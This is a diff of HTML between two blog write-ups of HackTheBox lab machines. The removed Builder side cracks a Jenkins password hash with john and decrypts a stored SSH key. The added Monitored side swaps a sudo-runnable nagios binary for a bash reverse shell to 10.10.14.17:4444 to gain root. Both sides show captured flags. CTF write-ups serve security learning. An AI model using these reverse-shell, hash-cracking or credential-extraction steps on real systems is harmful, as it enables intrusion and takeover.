-</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
-</span></span><span class="line"><span class="cl">      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;
-</span></span><span class="line"><span class="cl">  &lt;idToDirectoryNameMap <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;concurrent-hash-map&#34;</span>&gt;
-</span></span><span class="line"><span class="cl">    &lt;entry&gt;
-</span></span><span class="line"><span class="cl">      &lt;string&gt;jennifer&lt;/string&gt;
-</span></span><span class="line"><span class="cl">  &lt;version&gt;1&lt;/version&gt;
-</span></span><span class="line"><span class="cl">&lt;/hudson.model.UserIdMapper&gt;
-</span></span><span class="line"><span class="cl">  &lt;/idToDirectoryNameMap&gt;
-</span></span><span class="line"><span class="cl">&lt;hudson.model.UserIdMapper&gt;
-</span></span><span class="line"><span class="cl">    &lt;/entry&gt;
-</span></span><span class="line"><span class="cl">File to download:
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We found, there is a user named as <code>jennifer</code> and the directory name is <code>jennifer_12108429903186576833</code>.</p>
+<p><code>sudo -l</code> gave a list of command we can execute as root.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1928,168 +1933,84 @@
 </span><span class="lnt">28
 </span><span class="lnt">29
 </span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; var/jenkins_home/users/jennifer_12108429903186576833/config.xml                                                                                                                                                                    <span class="o">[</span>22/49<span class="o">]</span>
-</span></span><span class="line"><span class="cl">    &lt;hudson.tasks.Mailer_-UserProperty <span class="nv">plugin</span><span class="o">=</span><span class="s2">&#34;mailer@463.vedf8358e006b_&#34;</span>&gt;
-</span></span><span class="line"><span class="cl">    &lt;hudson.search.UserSearchProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;roles&gt;
-</span></span><span class="line"><span class="cl">    &lt;jenkins.security.seed.UserSeedProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;/tokenStore&gt;
-</span></span><span class="line"><span class="cl">    &lt;/hudson.search.UserSearchProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;timeZoneName&gt;&lt;/timeZoneName&gt;
-</span></span><span class="line"><span class="cl">  &lt;properties&gt;
-</span></span><span class="line"><span class="cl">    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;flags/&gt;
-</span></span><span class="line"><span class="cl">    &lt;hudson.model.MyViewsProperty&gt;
-</span></span><span class="line"><span class="cl">&lt;/user&gt;
-</span></span><span class="line"><span class="cl">    &lt;/jenkins.security.ApiTokenProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;views&gt;
-</span></span><span class="line"><span class="cl">        &lt;string&gt;authenticated&lt;/string&gt;
-</span></span><span class="line"><span class="cl">    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty <span class="nv">plugin</span><span class="o">=</span><span class="s2">&#34;display-url-api@2.200.vb_9327d658781&#34;</span>&gt;
-</span></span><span class="line"><span class="cl">&lt;user&gt;
-</span></span><span class="line"><span class="cl">          &lt;name&gt;all&lt;/name&gt;
-</span></span><span class="line"><span class="cl">  &lt;description&gt;&lt;/description&gt;
-</span></span><span class="line"><span class="cl">      &lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;
-</span></span><span class="line"><span class="cl">      &lt;collapsed/&gt;
-</span></span><span class="line"><span class="cl">    &lt;/jenkins.security.seed.UserSeedProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;/hudson.model.MyViewsProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;domainCredentialsMap <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.util.CopyOnWriteMap</span><span class="nv">$Hash</span><span class="s2">&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
-</span></span><span class="line"><span class="cl">    &lt;jenkins.security.ApiTokenProperty&gt;
-</span></span><span class="line"><span class="cl">      &lt;primaryViewName&gt;&lt;/primaryViewName&gt;
-</span></span><span class="line"><span class="cl">      &lt;/views&gt;
-</span></span><span class="line"><span class="cl">    &lt;/hudson.model.TimeZoneProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty <span class="nv">plugin</span><span class="o">=</span><span class="s2">&#34;credentials@1319.v7eb_51b_3a_c97b_&#34;</span>&gt;
-</span></span><span class="line"><span class="cl">    &lt;/hudson.model.PaneStatusProperties&gt;
-</span></span><span class="line"><span class="cl">    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
-</span></span><span class="line"><span class="cl">        &lt;tokenList/&gt;
-</span></span><span class="line"><span class="cl">    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
-</span></span><span class="line"><span class="cl">        &lt;/hudson.model.AllView&gt;
-</span></span><span class="line"><span class="cl">      &lt;timestamp&gt;1707318554385&lt;/timestamp&gt;
-</span></span><span class="line"><span class="cl">          &lt;owner <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.model.MyViewsProperty&#34;</span> <span class="nv">reference</span><span class="o">=</span><span class="s2">&#34;../../..&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">  &lt;/properties&gt;
-</span></span><span class="line"><span class="cl">    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
-</span></span><span class="line"><span class="cl">      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
-</span></span><span class="line"><span class="cl">          &lt;properties <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.model.View</span><span class="nv">$PropertyList</span><span class="s2">&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">    &lt;hudson.model.TimeZoneProperty&gt;
-</span></span><span class="line"><span class="cl">         &lt;hudson.model.AllView&gt;
-</span></span><span class="line"><span class="cl">    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
-</span></span><span class="line"><span class="cl">      &lt;providerId&gt;default&lt;/providerId&gt;
-</span></span><span class="line"><span class="cl">      &lt;/roles&gt;
-</span></span><span class="line"><span class="cl">    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
-</span></span><span class="line"><span class="cl">    &lt;hudson.model.PaneStatusProperties&gt;
-</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
-</span></span><span class="line"><span class="cl">  &lt;fullName&gt;jennifer&lt;/fullName&gt;
-</span></span><span class="line"><span class="cl">      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;
-</span></span><span class="line"><span class="cl">  &lt;id&gt;jennifer&lt;/id&gt;
-</span></span><span class="line"><span class="cl">  &lt;version&gt;10&lt;/version&gt;
-</span></span><span class="line"><span class="cl">      &lt;tokenStore&gt;
-</span></span><span class="line"><span class="cl">          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
-</span></span><span class="line"><span class="cl">    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty <span class="nv">plugin</span><span class="o">=</span><span class="s2">&#34;theme-manager@215.vc1ff18d67920&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">      &lt;passwordHash&gt;#jbcrypt:<span class="nv">$2</span>a<span class="nv">$10$UwR7BpEH</span>.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;
-</span></span><span class="line"><span class="cl">File to download:
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nagios@monitored:~$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> nagios on localhost:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User nagios may run the following commands on localhost:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios start
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios stop
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios restart
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios reload
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios status
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios checkconfig
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd start
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd stop
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd restart
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd reload
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd status
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/php
+</span></span><span class="line"><span class="cl">        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/php
+</span></span><span class="line"><span class="cl">        /usr/local/nagiosxi/scripts/migrate/migrate.php *
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>In <code>config.php</code> we found this passwordHash - <code>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></p>
-<p>Store this hash in <code>user.hash</code> and then using <code>john</code> we can get the password.</p>
+</div><p>One interesting script is <code>/usr/local/nagiosxi/scripts/manage_services.sh</code> which manages nagios, starts, stops, restart. I found this interesting also while checking the processes using <code>ps -ef</code> I found that the binary <code>/usr/local/nagios/bin/nagios</code> is also owned by <code>nagios</code>,</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt user.hash
-</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
-</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
-</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
-</span></span><span class="line"><span class="cl">Will run <span class="m">3</span> OpenMP threads
-</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
-</span></span><span class="line"><span class="cl">princess         <span class="o">(</span><span class="c1">#jbcrypt)</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nagios@monitored:~$ <span class="nb">cd</span> /usr/local/nagios/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nagios@monitored:/usr/local/nagios/bin$ mv nagios nagios.bk
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----- &lt;import this script using python&gt; ----
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.17/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- &lt;and replace with nagios&gt; ----
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nagios@monitored:/usr/local/nagios/bin$ chmod +x nagios
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
 </span></span></code></pre></td></tr></table>
 </div>
-</div><table>
-<thead>
-<tr>
-<th>User</th>
-<th>Password</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jennifer</td>
-<td>princess</td>
-</tr>
-</tbody>
-</table>
-<p>Now that I have user and password, I tried to login with SSH, but no luck. Next logical step will be to login with this creds from Jenkin’s Instance on web.</p>
-<p>After messing around with in the dashboard, I found Credentials tab in Manage Jenkins, in that there is a cred for root. On navigating the file, we can see something like this,</p>
-<p><img src="/images/Builder/Untitled%202.png" alt="Untitled" /></p>
-<p>The key is <code>Concealed for Confidentiality</code>. However in the source code we can able to see the private key.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span>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<span class="o">=}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>I tried to decrypt with base64 encoding, but it is encrypted. I found this answer to decrypt the private key → <a href="https://stackoverflow.com/a/37683492">https://stackoverflow.com/a/37683492</a></p>
-<p>Go to “Manage Jenkins” from Dashboard → “Script Console” on bottom — here we can able to run scripts — we also can get reverse shell using script console. Anyway, as of now, we will focus on decrypting our privatekey. Use this command to get the private ssh keys → <code>println( hudson.util.Secret.decrypt(&quot;ENCRYPTED_PASSPHRASE_OR_PASSWORD&quot;) )</code></p>
-<p><img src="/images/Builder/Untitled%203.png" alt="Untitled" /></p>
-<p>Save this private key into the filename <code>key</code>, change the permission to <code>600</code> and login with <code>ssh</code>.</p>
-<p><img src="/images/Builder/Untitled%204.png" alt="Untitled" /></p>
-<p>We got the flag.</p>
+</div><p>Start Reverse shell on port <code>4444</code> on new tab and boom, we will get the shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@builder:~# cat root.txt
-</span></span><span class="line"><span class="cl">e312ca26bd37fcbad7bd5f74ce90e78a
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@monitored:/root# cat root.txt
+</span></span><span class="line"><span class="cl">12211c34944207f567ba8a6824e8a629
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -2291,13 +2212,13 @@
     
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fg4nd1v.github.io%2fposts%2fhackthebox-builder%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fg4nd1v.github.io%2fposts%2fhackthebox-monitored%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
         </a>
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=HackTheBox%20Writeup%20-%20Builder%20Room&url=https%3a%2f%2fg4nd1v.github.io%2fposts%2fhackthebox-builder%2f&hashtags=HackTheBox%2cCVE%2cJenkins&via=g4nd1v" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=HackTheBox%20Writeup%20-%20Monitored%20Box&url=https%3a%2f%2fg4nd1v.github.io%2fposts%2fhackthebox-monitored%2f&hashtags=HackTheBox%2cSNMP%2cnagios&via=g4nd1v" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2434,15 +2355,11 @@
     <ul class="related-ul">
         
         <li>
+          <a href="/posts/hackthebox-builder/" class="related__link">HackTheBox Writeup - Builder Room</a>
+        </li>
+        
+        <li>
           <a href="/posts/hackthebox-analytics/" class="related__link">HackTheBox Writeup - Analytics Room</a>
-        </li>
-        
-        <li>
-          <a href="/posts/tryhackme-agentsudo/" class="related__link">TryHackMe Writeup - Agent Sudo Room</a>
-        </li>
-        
-        <li>
-          <a href="/posts/tryhackme-blueprint/" class="related__link">TryHackMe Writeup - Blueprint Room</a>
         </li>
         
     </ul>
@@ -2452,21 +2369,14 @@
 <nav class="pagination-single">
   
     
-      <a href="https://g4nd1v.github.io/posts/hackthebox-analytics/" class="pagination-single__left">
+      <a href="https://g4nd1v.github.io/posts/hackthebox-builder/" class="pagination-single__left">
         <div class="pagination-single__icon">
           <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
         </div>
-        <div class="pagination-single__left-title">HackTheBox Writeup - Analytics Room</div>      
+        <div class="pagination-single__left-title">HackTheBox Writeup - Builder Room</div>      
       </a>
     
     <div class="grow"></div>
-    
-      <a href="https://g4nd1v.github.io/posts/hackthebox-monitored/" class="pagination-single__right">      
